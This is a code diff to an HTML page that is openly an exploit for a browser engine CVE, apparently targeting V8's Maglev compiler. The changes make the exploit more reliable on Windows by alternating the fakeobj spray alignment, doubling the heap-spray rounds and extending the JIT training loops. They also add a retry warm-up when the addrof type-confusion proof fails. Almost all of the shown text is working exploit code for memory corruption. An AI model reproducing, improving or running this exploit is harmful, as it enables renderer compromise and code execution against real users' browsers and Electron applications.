@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CVE-2026-85046 - automatic bounded cage R/W probe</title>
+    <title>CVE-2026-85046 - Windows alternating-reclaim probe v3</title>
     <meta charset="UTF-8">
     <style>
         * { box-sizing: border-box; }
@@ -264,7 +264,11 @@ function attempt_fakeobj() {
     //      dangling address ≡ 0 (mod 8)  -> use the phase-4 pattern
     var slotLeak = Number(String(bad).split(',')[2]);
     var dead_addr = (slotLeak * 2) >>> 0;       // untagged base of the dead young object
-    var pattern = (dead_addr & 4) ? 4 : 0;       // alternate alignment gate for Electron runtime
+    // Windows and Linux builds showed different successful FixedDoubleArray
+    // window alignment despite the same compressed map constants. Alternate
+    // both candidates across fresh fakeobj attempts.
+    var original_pattern = (dead_addr & 4) ? 0 : 4;
+    var pattern = (window.f022SprayAttempt & 1) ? original_pattern : (original_pattern ^ 4);
     dbg('      [5] dangling addr=' + hex(dead_addr) + ' pattern=' + pattern +
         ' victim=' + hex(victim_base));
 
@@ -273,7 +277,7 @@ function attempt_fakeobj() {
     // 64 rounds x 4 x 128KB = 32MB — enough to flip an 8MB semispace pair
     // and re-cover the dead address even at a deep offset.
     dbg('      [6] spraying...');
-    spray(victim_elems_tagged, pattern, 64);
+    spray(victim_elems_tagged, pattern, 128);
 
     // Debug pause (#auto#pause): spin so gdb can attach to the renderer and
     // dump memory around dead_addr before the deref (crashes invalidate it).
@@ -358,11 +362,12 @@ function runExploit() {
     }
 
     // ================= Step 1: train Maglev =================
-    log('[*] Step 1: Training Maglev with mixed element kinds (1000 iterations)...');
-    for (var i = 0; i < 1000; i++) {
+    log('[*] Step 1: Training Maglev with mixed element kinds (8000 iterations)...');
+    for (var i = 0; i < 8000; i++) {
         confuse([6, 9, 4, 2, 0]);   // PACKED_SMI_ELEMENTS
         confuse([{}, {}, {}]);      // PACKED_ELEMENTS
     }
+    for (var settle = 0; settle < 32; settle++) confuse([1, 2]);
     log('    Training complete.');
 
     // ================= Step 2: trigger + addrof proof =================
@@ -377,6 +382,22 @@ function runExploit() {
         var n = Number(s);
         return Number.isInteger(n) && n > 100000 && n < 4294967296;
     });
+    if (!looksLikeAddresses) {
+        log('    First trigger was not optimized; applying an additional warm-up...');
+        for (var retryWarmup = 0; retryWarmup < 12000; retryWarmup++) {
+            confuse([6, 9, 4, 2, 0]);
+            confuse([{}, {}, {}]);
+        }
+        demo = [{ a: 1 }, { a: 2 }, { a: 3 }];
+        confuse(demo);
+        strRep = String(demo);
+        log('    Retry String(bad) = ' + strRep);
+        parts = strRep.split(',');
+        looksLikeAddresses = parts.length >= 2 && parts.every(function(s) {
+            var n = Number(s);
+            return Number.isInteger(n) && n > 100000 && n < 4294967296;
+        });
+    }
     if (!looksLikeAddresses) {
         log('    No confusion detected — see notes at the bottom of the page.');
         var fixedResult = {
@@ -411,6 +432,7 @@ function runExploit() {
     var attempts = 0, maxAttempts = 4;
     while (!master && attempts < maxAttempts) {
         attempts++;
+        window.f022SprayAttempt = attempts;
         log('    Attempt ' + attempts + '/' + maxAttempts + ': promote -> confuse -> unshift -> spray...');
         try {
             var st = attempt_fakeobj();
